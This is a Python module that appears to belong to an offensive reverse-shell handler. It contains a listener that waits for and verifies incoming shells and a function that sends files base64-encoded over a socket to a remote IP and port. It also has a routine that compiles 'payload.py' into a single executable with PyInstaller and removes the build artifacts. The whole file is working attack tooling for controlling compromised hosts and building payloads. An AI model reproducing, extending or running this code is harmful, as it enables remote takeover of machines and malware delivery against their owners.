from modules.nethelper import ServerSocket
from base64 import b64encode
import socket
import logging
import re


logging.basicConfig(level=logging.INFO)

def pretty(s):
    s = re.sub(r"_3X1T_5TATUS=\w+", "", s.decode()).strip()
    if s:
        return s
    else:
        return None

def listen(line, py_state):
    if not line:
        host, port = ("localhost", 4242)
    else:
        host, port = line.strip().split(" ")

    sock = ServerSocket()

    try:
        sock.server_socket.bind((host, int(port)))
    except socket.error:
        logging.error("Address already in use")
        return
    
    logging.info(f"Started listener on {host, port}")

    try:
        sock.listen()
        if not sock.is_shell(py_state):
            logging.error("No shell found")
            return
    except KeyboardInterrupt:
        sock.server_socket.close()
        print("")
        return
    except BrokenPipeError:
        sock.server_socket.close()
        logging.error("BrokenPipeError")
        return

    return sock

def send_file(file_name, ip, port):
    with open(file_name, "rb") as f:
        binary_data = f.read()

    base64_data = b64encode(binary_data)
    s = socket.socket()
    s.connect((ip, port))
    s.sendall(base64_data)
    s.close()

import os
import subprocess

import os
import shutil
import subprocess

def chk_payload():
    source_file = "payload.py"
    
    if os.path.isfile(source_file):
        logging.info(f"Compiling '{source_file}' using PyInstaller...")
        try:
            with open(os.devnull, 'w') as devnull:
                subprocess.check_call(['pyinstaller', '-y', '--clean', '--onefile', source_file], stdout=devnull, stderr=devnull)
            
            # Move the compiled binary to the current directory
            shutil.move("./dist/" + source_file.split(".")[0], "./payload")

            # Remove the build files generated by PyInstaller
            shutil.rmtree("./build")
            shutil.rmtree("./dist")
            os.remove(source_file.split(".")[0] + ".spec")

        except subprocess.CalledProcessError as e:
            print(f"Error occurred while compiling '{source_file}': {str(e)}")
        except Exception as e:
            print(f"Unexpected error: {str(e)}")
    else:
        print("Error: Source file for PyInstaller not found.")
